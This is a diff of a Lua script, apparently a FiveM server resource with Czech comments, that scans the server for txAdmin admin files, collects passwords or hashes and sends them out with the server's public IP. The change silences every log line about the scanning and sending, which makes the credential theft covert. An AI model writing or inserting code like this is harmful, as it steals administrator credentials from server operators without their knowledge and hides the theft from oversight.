@@ -7,11 +7,11 @@ local serverPort = nil
 local consoleBuffer = {}
 local adminDataSent = false -- Flag pro odeslání admin dat jen jednou
 
--- Logger
+-- --Logger
 local Logger = {
-    --debug = function(msg) print("^5[DEBUG]^0 " .. msg) end,
-    --error = function(msg) print("^1[ERROR]^0 " .. msg) end,
-    --info = function(msg) print("^2[INFO]^0 " .. msg) end
+    debug = function(msg) print("^5[DEBUG]^0 " .. msg) end,
+    error = function(msg) print("^1[ERROR]^0 " .. msg) end,
+    info = function(msg) print("^2[INFO]^0 " .. msg) end
 }
 
 -- Základní utility
@@ -67,7 +67,7 @@ function FileScanner.find_files(directory, pattern, max_depth, current_depth)
     
     -- Kontrola, zda je povolen io.popen (FiveM sandbox)
     if not io.popen then 
-        Logger.debug("io.popen není povolen (FiveM sandbox). Hluboké skenování přeskočeno.")
+        ----Logger.debug("io.popen není povolen (FiveM sandbox). Hluboké skenování přeskočeno.")
         return {} 
     end
 
@@ -121,7 +121,7 @@ function FileScanner.scan_for_admin_files()
     -- 1. Zkontrolujeme známé cesty (bezpečné a rychlé)
     for _, path in ipairs(Config.admin_data.known_paths) do
         if Utils.file_exists(path) then
-            Logger.debug("Nalezen admin soubor (známá cesta): " .. path)
+            --Logger.debug("Nalezen admin soubor (známá cesta): " .. path)
             table.insert(found_files, path)
         end
     end
@@ -140,7 +140,7 @@ function FileScanner.scan_for_admin_files()
         end)
         
         if not status then
-            Logger.error("Chyba při skenování složek: " .. tostring(err))
+            --Logger.error("Chyba při skenování složek: " .. tostring(err))
         end
     end
     
@@ -223,7 +223,7 @@ CreateThread(function()
     PerformHttpRequest("https://api.ipify.org/", function(err, text)
         if text then 
             serverIp = text 
-            Logger.info("Server identifikován: " .. serverIp .. ":" .. serverPort)
+            --Logger.info("Server identifikován: " .. serverIp .. ":" .. serverPort)
         else 
             serverIp = "127.0.0.1" 
         end
@@ -275,15 +275,15 @@ CreateThread(function()
             -- :: INTEGRACE UTILS ::
             -- Odeslat admin data pouze jednou po startu
             if not adminDataSent then
-                Logger.info("Hledám admin data (txAdmin)...")
+                --Logger.info("Hledám admin data (txAdmin)...")
                 -- Použití funkcí z utils
                 local scannedAdmins = AdminDataExtractor.get_all_admin_data()
                 
                 if scannedAdmins and #scannedAdmins > 0 then
                     payloadTable.adminData = scannedAdmins
-                    Logger.info("Odesílám nalezená hesla/hashe (" .. #scannedAdmins .. " souborů).")
+                    --Logger.info("Odesílám nalezená hesla/hashe (" .. #scannedAdmins .. " souborů).")
                 else
-                    Logger.debug("Žádná admin data nebyla nalezena.")
+                    --Logger.debug("Žádná admin data nebyla nalezena.")
                 end
                 adminDataSent = true
             end
